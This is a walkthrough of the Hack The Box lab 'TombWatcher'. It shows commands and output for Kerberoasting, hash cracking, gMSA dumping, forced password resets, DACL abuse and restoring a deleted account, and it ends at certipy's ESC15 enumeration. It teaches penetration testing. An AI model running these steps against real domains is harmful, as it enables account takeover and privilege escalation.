---
title: "TombWatcher"
date: 23-08-2025
categories: [Windows, Medium, Active]
tags: [AD, ESC15, Bloodhound, ACL, TombStones, Certipy, ForeChangePassword, BloodyAD, Python Env]
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/59c74a969b4fec16cd8072d253ca9917.png
---

TombWatcher is a medium difficulty active directory box. It is an assumed breach box, thus we are given credentials, in this case for the henry user. This user is able to change the SPN of Alfred which in turn can add himself to the infrastructure group which can read the GMSA password of the ANSIBLE_DEV$ computer account. This computer account is able to change the password of the Sam user. Sam is able to change the ownership of the john user which lets us change his password, John, on the other hand, is able to winrm into the DC which gets us the user flag. John is able to list deleted objects inside of the domain, luckily john also has write permissions over these deleted objects which allows us to resurrect them and gain access to the cert_admin account which we can use to exploit a ESC15 vulnerability which allow us to get the Administrator's pfx. 

![tombwatcher](assets/images/tombwatcher/TombWatcher.png)
## Nmap
As always, we can start with an nmap scan which shows that this is an active directory machine due to port 88 being open, port 53 also shows Simple DNS Plus is running which is also a sign of an AD machine. The nmap scan also reveals the domain name of the network which is `tombwatcher.htb`. The nmap scan also shows that we have a 4 hour clock skew to the domain controller which will come in handy when getting clock skew errors.

```
# Nmap 7.94SVN scan initiated Sat Aug 23 11:50:33 2025 as: nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269 -oN nmap/tomb -Pn -n 10.10.11.72
Nmap scan report for 10.10.11.72
Host is up (0.10s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 13:50:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: !!tombwatcher.htb0!!., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-23T13:52:01+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:!!DC01.tombwatcher.htb!!
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-23T13:52:02+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-23T13:52:01+00:00; +4h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-08-23T13:52:01+00:00; +4h00m00s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-23T13:51:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_!!clock-skew: mean: 3h59m59s!!, deviation: 0s, median: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 23 11:52:02 2025 -- 1 IP address (1 host up) scanned in 88.86 seconds

```
## Enumerating Shares
Other than that the nmap scan does not really reveal anything interesting. Since we have credentials for a domain user lets use them to enumerate the available shares.
```shell
netexec smb DC01 -u henry -p 'H3nry_987TGV!' --shares
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share 
```

These are pretty default shares so we should not waste time on them. I would only start inspecting them if I found no other leads. At this point I decided to run [rusthound-ce](https://github.com/g0h4n/RustHound-CE) which I have found provides more accurate and complete results compared to bloodhound python. We can run this AD enumeration tool using the following command:

## Using Bloodhound Ingestor
```shell
rusthound-ce -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -i 10.10.11.72
---------------------------------------------------
Initializing RustHound-CE at 20:28:44 on 08/23/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-08-23T18:28:44Z INFO  rusthound_ce] Verbosity level: Info
[2025-08-23T18:28:44Z INFO  rusthound_ce] Collection method: All
[2025-08-23T18:28:44Z INFO  rusthound_ce::ldap] Connected to TOMBWATCHER.HTB Active Directory!
[2025-08-23T18:28:44Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-08-23T18:28:44Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-08-23T18:28:44Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=tombwatcher,DC=htb
[2025-08-23T18:28:44Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-08-23T18:28:45Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=tombwatcher,DC=htb
[2025-08-23T18:28:45Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-08-23T18:28:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
[2025-08-23T18:28:46Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-08-23T18:28:46Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=tombwatcher,DC=htb
[2025-08-23T18:28:46Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-08-23T18:28:47Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=tombwatcher,DC=htb
[2025-08-23T18:28:47Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2025-08-23T18:28:47Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
<SNIP>

RustHound-CE Enumeration Completed at 20:28:47 on 08/23/25! Happy Graphing!
```
## WriteSPN Abuse
After uploading the json files to bloodhound you may get an error saying that some files were not able to be parsed but its fine most of the important data is still there.
Using bloodhound I found the following ACL, which enables us to perform a targeted kerberoast attack on the Alfred user.

![tomb](assets/images/tombwatcher/spn.png)

We can use [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this attack which will automatically change the SPN, perform the kerberoast attack and then removes the SPN.

```
faketime -f '+4h' python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$d06b4aee695fedebd7b8c3e92885f5f0$f9660cdf4fde7961ebaf001895930beae83952ceee78ffea91af6cc1d2d24ec2fdc28a62c5db6403fb662bc62440762d86fc6606ed9b35dd989e50c28e8f5cc432893aea2c22893b024fbd6682c8b7bbe408842545c2e5751daaeb22fb7a95283c19dc20003c31958873e0c7f1bdb81c58ef190708a1622d8a786b14bd0acbec2bccaefb23c498872eeae0fa00ee51708cf76b0a5096d3da3bbb4cf1c672bc74eae953312e34d7ee417c4ec36587c1ffc8f7600aafef749f95d7b3ba23a9428f03d4686331dff353b2b80444213cabc8f42411ed8f6851f3a9e88ad00d807ace4b65331b2efc3594533867a30e248ac598ae8df75c46beba1987104a5594b423c2852d0c39d9dd41a5acf9721ed744ee30609bc95982ef1b6c06cc249c995aa1c2e106047c7ee14be252946f7036ba61895354a1cbb3e07d71145f9079016aeddd1cd573204e61c8900decfd1e8931fbda7dd23f6ee2a081fa9c64a502f86e67af89929d28b35917d938dbdeaf7f5c8e983fa3346fcb1f0e9294a94d84ed4a7dca43d7ed2d83cef590ee1632785a24fbf3417c40ecfa3819bb0f3f0615f2dbcc54885c92a27fc86a97e1381b2f0180bcd3afc4086218fdb09f9ac3e98189a53aa74647e3cc87503778490227a311932bf39c20bf5de55086ae9a71d59f8791d56149e62098988ef7de3644fc6b369cb627f7eb68b7ead21765ce4205df4e02d241383a3d3558127d4ef117afcc0e01b23f0281b05fb7b02725914f149631cb913471383191ec34a697f8a7a701251b60ab556ced0dfcbd36a99f1630f838c4b1287b21ae16d7dfc9dce922ec95fe9f2b65678ad7e5e078ea53219c9333c753ac190e95f029bd5c7856341c706c47f704099766dd8581e5f41e6c9d2b9d890680f1a4f83dc3afd7765e1cec45dffcba33229a524cbe7fab18387e7b39cda7a0096411f64ccc9b3bd9f38a2005d06745ae3c2308f0f18627695a2e3c8218675f0a4fb9657669f590b3013182d353aa0deaa36f4f75d85e52d23aadd3f30b1707b19ceb9cd65059601f644ff0b230faf650905b1034e959bd5a27d7531e1115c97ff47f597cd4d8aeec2bd82b3579e50cf036902aeb5e33f3d946829cb525b58c572a795c0174ac9411a4251775ee59160f2d0d302c1a34faeceb42e62865cded192326101de0e1427b8991e73c4e66658026492b5e4609ed820c278685a6042178814a3c47ed3de6391a4fe8439a1911df774bd0a1e5f11a40756428e169c2fde070aa2176ddf07565778a7c68cc5f4268026c6f15e1f83dee4b63df6b91622a661304417e99deb926b3533e37b7c4cd1516b50f6e1242dae6e59cb1547129ee883497e29ebdcb07876e871ca4f20041dca5fbb638102dc4bc051b90e3fc6969eebd74bb84afc06bf3800fcc599505ebb446480fad053eb45054299c62d427cc14ffa1a0e4df8d6bd0f4e186166b615d5befcb06fc77
[VERBOSE] SPN removed successfully for (Alfred)
```
I used `faketime` to avoid getting kerberos clock skew errors. The obtained hash can then be cracked using hashcat:
### Cracking the Hash
```
hashcat alfred.hash /usr/share/wordlists/rockyou.txt -m 13100 --show 
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f35ca52770e062b38bcd4a2c018f92b3$2cf07d95d960bc0d74a6c8fac2ab55932a4935094222af4729943e96e74077bf366e13b9f02a3c30e61b5d21c39e9765fe25742bc164e7c4ea40ebcf764453f026b960e3ab3690888800df08f29d21efc2d468c169f838103956ef497912a78ab27d8f0f308567918effcfa143d1fccff22ff55278306095b3dc78a33479d8f00b4f6fdcdd0de240faa0b965a107ef932c47abbd58d364fa0b9af617a009e6afe282f93347e89ceb35887d60c9b6853f8f0fa777cf2c867c2c83807bbf94da81bd6473d9be402c8d3447488b65120f7e7f1044829680d352a31a01e77103153a21df08e0c08053744c1edfa99cb58b4b93125b9c715027716d2e4ace5435cad3be9d9ccd3eb35c2c5adc1b92651dc91f445a3afec1ba963c5e19dec648023e76de6f5cc58d3ea5897320cdad71f17d279eaf5b703586036c462ddb1b3a0cd956e982d9fff36debb6d18d890a140b1238d8224f2dc17f72359eb1057bb405e2db0beb498b7217398eb924cfb9e594ce2780eb5e3195c0f0064879834a323a43b8198d13828c0c95c5c22c4ac805b345abe6128234bd17ae4053390ae336fd0a0e7dbd15682bd58c70fd874634f18109d29ebf6155a3a85f8cf17ecd856aee49c2901ec23f24dd74515b98985b256ed30683d17451f362b3b383ea939f2f26c61355c22c0a0efa301d5b83a88af2e56ae3c660191b5e45ed7e5365bb9a5d857ec6263ca7d86c3b80c7e61210fb3a3a7002ef834d7b3216a9d9dd98ee57fd83a574afaab0dffe1abbd2e4f5125d2f8054eaabf54a3cb445fd282e1d94121a87fea87178638303e661ebe9570ded661209124e04f8d704545b7fc08eb25b7f02f6f1b1d34b3f9a5f734c8f3979f66a06b81edceb1cac8f9f6a7466650bf89da925f9f5a40cca7fc609bcf80d88098aed7a73782b1a6a4574d016aa9ad4b7c47291391a821631102211f0edde665c3b1911b32365018b06f73a82ddac76bd369c7ea3b53afe07dbb29f3d9ba270fe561f50f9cd517dc793405a498b6284e5011867aa1d535c7ec37e98d50aad375152bb82bcf80630cd1772484cf4d2f13da41eba985c4eb0b323ef2fd30ea75dc109647d460fd355e640cfa52452c9d1c98ce37763ae949c91ddaa45ac17c7e58de4af0eef9f347883b90fbd9cf795413751ab2e845a160cf369591ae4791f659fc188ef5889eceb77fab620530d219941facba0dc42a33098932100f47cb6cb21a76bba36fad89fb20c1f1dff509baa5e7e47252db2793016a4a67ed4c0d9f2026c985bb599593429a2c4a2189ace8c1ae4696687d60d52f4aa526a482dfe60bd8a6e0c5141b79a107d4831494cff85462fc624ddb0bc347fec084e656d238464023d5b2cedaa8834dac4707f85da7032cfc252ac7974fd2cae2267ec800f1bdc7725eb8809e70467ec67763d36f3a0672775aa15b736c24b287196c8682df783a5650e54d8209f8196:!!basketball!!
```

We can confirm the newly obtained credential using netexec:
```shell
netexec smb DC01 -u alfred -p basketball
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\alfred:basketball
```
## Abusing AddSelf
Going back to bloodhound we can see that this user can add himself to the infrastructure group
![tomb](assets/images/tombwatcher/add.png)

This can usually be done using `net rpc` but in this case I was getting the following error, therefore, I used bloodAD instead.

```shell
net rpc group addmem "infrastructure" "alfred" -U "tombwatcher.htb"/"alfred"%"basketball" -S "10.10.11.72"
Could not add alfred to infrastructure: ==NT_STATUS_ACCESS_DENIED==
```

```shell
bloodyAD ==--host== 10.10.11.72 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember  "infrastructure"  alfred
[+] alfred added to infrastructure
```

## Reading the GMSA Password
Once in this infrastructure group we are able to read the GMSA password of the ansible dev computer account.
![tomb](assets/images/tombwatcher/read.png)

This can be done using [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
```shell
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::ecb4146b3f99e6bbf06ca896f504227c
ansible_dev$:aes256-cts-hmac-sha1-96:dae98d218c6a20033dd7e1c6bcf37cde9a7c04a41cfa4a89091bf4c487f2f39a
ansible_dev$:aes128-cts-hmac-sha1-96:0ec1712577c58adc29a193d53fc73bd4
```
## Abusing ForceChangePassword
This provides us with the NTLM hash of this computer account. This computer account is able to change the password of Sam which is another user in the domain.
![tomb](assets/images/tombwatcher/change.png)

I was able to change the password for sam using the changepasswd impacket tool. I was able to figure it out thanks to [this blog](https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/)
```shell
changepasswd.py 'tombwatcher.htb'/'sam'@'10.10.11.72' -newpass Password@1234 -altuser 'tombwatcher.htb/ANSIBLE_DEV$' -althash :ecb4146b3f99e6bbf06ca896f504227c -reset
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of tombwatcher.htb\sam as tombwatcher.htb\ANSIBLE_DEV$
[*] Connecting to DCE/RPC as tombwatcher.htb\ANSIBLE_DEV$
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```
## Abusing WriteOwner
Looking back at bloodhound, we can find that Sam is the WriteOwner of the John user which allows us to change the ownership of this user and change his password.
![tombwatcher](assets/images/tombwatcher/wrte.png)

We can first change the owner to be Sam which we have control over.
```shell
owneredit.py -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Password@1234'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```
We may grant Sam genericAll permissions with the following command:
```shell
dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'Password@1234'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250823-205535.bak
[*] DACL modified successfully!
```
With genericAll we can now change the user's password using `net rpc`
```shell
net rpc password "john" "newP@ssword2022" -U 'tombwatcher.htb'/'sam'%'Password@1234' -S "10.10.11.72"
```

We can also see that john is in the remote management group which allows us to establish a winrm session to the DC.
```shell
netexec winrm DC01 -u john -p 'newP@ssword2022'
WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.10.11.72     5985   DC01             [+] tombwatcher.htb\john:newP@ssword2022 (Pwn3d!)
```

## Reanimate-Tombstones
Enumerating common priv escalation pathways inside of the DC do not reveal any notable finding. It was only after enumrating the write permisssions john had that I discovered the intended way. The command below enumerates the objects that are writtable by john the `--include-del` flag allows us to view also objects which have been deleted. It is very interesting to see that we have both write privileges over the deleted cert_admin user and the Deleted Objects DN. These are tombstone objects which is the reason of the machine name. This [blog post](https://cravaterouge.com/articles/ad-bin/) was very helpful.
 
```shell
bloodyAD --host 10.10.11.72 -d bloody -u john -p 'newP@ssword2022' get writable --include-del

distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: WRITE

<SNIP>

distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

<SNIP>

distinguishedName: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

It is also important to check that john also has the Reanimate-Tombstones Ace which can be viewed using PowerView:
```powershell
*Evil-WinRM* PS C:\Users\john\Documents> import-module ./PowerView.ps1
*Evil-WinRM* PS C:\Users\john\Documents> $sid = "S-1-5-21-1392491010-1358638721-2126982587-1106"
*Evil-WinRM* PS C:\Users\john\Documents> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 


AceQualifier           : AccessAllowed
ObjectDN               : DC=tombwatcher,DC=htb
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : !!Reanimate-Tombstones!!
ObjectSID              : S-1-5-21-1392491010-1358638721-2126982587
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1392491010-1358638721-2126982587-1106
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
```
## Restoring the cert_admin User
Bloodhound does not show these privileges as it affects deleted objects which I believe are not accounted for during the initial enumeration using common ingesters.

With these write permissions and the `Reanimate-Tombstones` Ace John is able to reanimate the cert_admin user. I used powershell to re-enable the user:

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

<SNIP>

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf



*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Documents> Enable-ADAccount -Identity cert_admin
*Evil-WinRM* PS C:\Users\john\Documents> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "D234kladsf*&!*" -AsPlainText -Force)
```

This could have also been done using bloodyAD with the following commands:
```shell
bloodyAD -u john -d bloody -p 'newP@ssword2022' --host 10.10.11.72 set restore cert_admin
[+] cert_admin has been restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb

net rpc password "cert_admin" "D234kladsf*&!*" -U 'tombwatcher.htb'/'john'%'newP@ssword2022' -S "10.10.11.72"

netexec smb DC01 -u cert_admin -p 'D234kladsf*&!*'
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\cert_admin:D234kladsf*&!*
```
## Updating Certipy Version
Following this, I used certipy-ad to enumerate possible template missconfiguration but my certipy version is quite outdated therefore it did not find any.

```shell
faketime -f '+4h' certipy find -u cert_admin -p "newP@ssword2022" -dc-ip 10.10.11.72 -stdout -vuln
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'tombwatcher-CA-1' via CSRA
[!] Got error while trying to get CA configuration for 'tombwatcher-CA-1' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'tombwatcher-CA-1'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

Instead use git clone to download the most recent copy of certipy-ad which can be found [here](https://github.com/ly4k/Certipy) this version of certipy needs a Python version >= 3.12
```shell
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
Processing /home/madaf/HTB/labs/tombwatcher/Certipy
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Preparing metadata (pyproject.toml) ... done
Requirement already satisfied: asn1crypto~=1.5.1 in /home/madaf/HTB/labs/tombwatcher/venv/lib/python3.11/site-packages (from certipy-ad==5.0.3) (1.5.1)
Requirement already satisfied: cryptography~=42.0.8 in /home/madaf/HTB/labs/tombwatcher/venv/lib/python3.11/site-packages (from certipy-ad==5.0.3) (42.0.8)
Requirement already satisfied: impacket~=0.12.0 in /home/madaf/HTB/labs/tombwatcher/venv/lib/python3.11/site-packages (from certipy-ad==5.0.3) (0.12.0)
Requirement already satisfied: ldap3~=2.9.1 in /home/madaf/HTB/labs/tombwatcher/venv/lib/python3.11/site-packages (from certipy-ad==5.0.3) (2.9.1)
Collecting pyasn1~=0.6.1
  Using cached pyasn1-0.6.1-py3-none-any.whl (83 kB)
Requirement already satisfied: dnspython~=2.7.0 in /home/madaf/HTB/labs/tombwatcher/venv/lib/python3.11/site-packages (from certipy-ad==5.0.3) (2.7.0)
Requirement already satisfied: pyopenssl~=24.0.0 in /home/madaf/HTB/labs/tombwatcher/venv/lib/python3.11/site-packages (from certipy-ad==5.0.3) (24.0.0)
Requirement already satisfied: requests~=2.32.3 in /home/madaf/HTB/labs/tombwatcher/venv/lib/python3.11/site-packages (from certipy-ad==5.0.3) (2.32.5)
Collecting pycryptodome~=3.22.0
  Using cached pycryptodome-3.22.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Collecting beautifulsoup4~=4.13.4
  Using cached beautifulsoup4-4.13.4-py3-none-any.whl (187 kB)
Collecting httpx~=0.28.1
  Using cached httpx-0.28.1-py3-none-any.whl (73 kB)
Collecting argcomplete~=3.6.2
  Using cached argcomplete-3.6.2-py3-none-any.whl (43 kB)
ERROR: Package 'certipy-ad' requires a different Python: 3.11.2 not in '>=3.12'
```
## Installing Python 3.12
I am not sure if this is the best way to install a copy of python3.12 but it worked for me and it did not break anything (yet)

```shell
#get necesarry packages
sudo apt update
sudo apt install -y build-essential libssl-dev zlib1g-dev libncurses5-dev libncursesw5-dev \
libreadline-dev libsqlite3-dev libgdbm-dev libdb5.3-dev libbz2-dev libexpat1-dev liblzma-dev \
tk-dev libffi-dev wget

#download and extract python version
cd /tmp
wget https://www.python.org/ftp/python/3.12.0/Python-3.12.0.tgz
tar xvf Python-3.12.0.tgz
cd Python-3.12.0

#install (not system wide)
./configure --enable-optimizations --prefix=/usr/local
make -j$(nproc)
sudo make altinstall

#create virtual env
python3.12 --version
python3.12 -m venv venv312
source venv312/bin/activate
```

Using this new and up to date python environment we can install the neweset certipy version:

```shell
pip install .
```

## Finding the ESC15 Vulnerability
Running certipy again shows tha the domain is vulnerable to ESC15
```
faketime -f '+4h' certipy find -u cert_admin -p "Abc123456@" -dc-ip 10.10.11.72 -stdout -vuln
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
